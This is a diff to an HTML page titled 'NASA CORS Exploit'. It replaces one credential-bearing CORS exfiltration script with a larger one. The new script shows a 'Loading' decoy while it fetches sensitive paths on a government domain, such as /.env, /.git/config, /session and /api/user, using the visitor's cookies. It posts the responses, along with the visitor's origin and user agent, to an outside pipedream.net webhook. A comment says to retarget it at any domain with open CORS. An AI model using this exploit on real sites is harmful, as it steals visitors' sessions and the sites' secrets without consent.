@@ -1,19 +1,51 @@
-<script>
-fetch("https://vis.globe.gov/app/js/VISmain.js", {
-  method: "GET",
-  credentials: "include"
-})
-  .then(res => res.text())
-  .then(data => {
-    fetch("https://eojzzzf3qvc4t0o.m.pipedream.net", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        message: "🔥 CORS Exfiltration Success",
-        content: data
-      })
-    });
-  });
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>NASA CORS Exploit</title>
+</head>
+<body>
+  <h1>Loading... Please wait</h1>
+  <script>
+    const target = "https://usgeo.gov";  // غيّر هذا لأي دومين فيه CORS مفتوح
+    const webhook = "https://eojzzzf3qvc4t0o.m.pipedream.net";
+
+    const paths = [
+      "/robots.txt", "/sitemap.xml", "/config.js", "/user/profile", "/account",
+      "/dashboard", "/session", "/api/user", "/.env", "/.git/config", "/js/app.js",
+      "/js/config.js", "/data.json", "/info", "/internal/status", "/admin",
+      "/modules", "/GLOBE/"
+    ];
+
+    const send = async (path, content, status) => {
+      await fetch(webhook, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          origin: location.origin,
+          userAgent: navigator.userAgent,
+          url: target + path,
+          status: status,
+          content: content.slice(0, 1000) // Limit for safety
+        })
+      });
+    };
+
+    const exploit = async () => {
+      for (const path of paths) {
+        try {
+          const res = await fetch(target + path, {
+            credentials: "include",  // important if cookies are used
+            mode: "cors"
+          });
+          const text = await res.text();
+          send(path, text, res.status);
+        } catch (err) {
+          send(path, "ERROR: " + err.message, 0);
+        }
+      }
+    };
+
+    exploit();
+  </script>
+</body>
+</html>
